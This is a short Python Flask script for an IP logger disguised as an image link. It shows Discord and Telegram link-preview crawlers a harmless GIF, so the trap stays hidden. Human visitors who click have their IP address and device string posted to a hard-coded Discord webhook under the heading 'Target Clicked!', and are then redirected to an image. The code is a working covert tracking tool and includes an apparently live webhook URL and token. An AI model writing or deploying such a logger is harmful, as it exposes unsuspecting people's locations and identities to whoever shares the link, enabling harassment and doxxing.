import os
import requests
from flask import Flask, request, redirect, send_file
import io

app = Flask(__name__)

# YOUR WEBHOOK URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"

@app.route('/view/image_01.png')
def logger():
    user_agent = request.user_agent.string.lower()
    
    # 1. DISCORD PREVIEW: Show the Tenor Trolling GIF
    if "discord" in user_agent or "telegram" in user_agent:
        # Direct Tenor Media Link
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # 2. THE TRAP: Grab human IP
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    payload = {
        "content": f"🎯 **Target Clicked!**\n**IP:** `{user_ip}`\n**Device:** `{request.user_agent}`"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    # 3. THE REDIRECT: Send them to the final image
    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
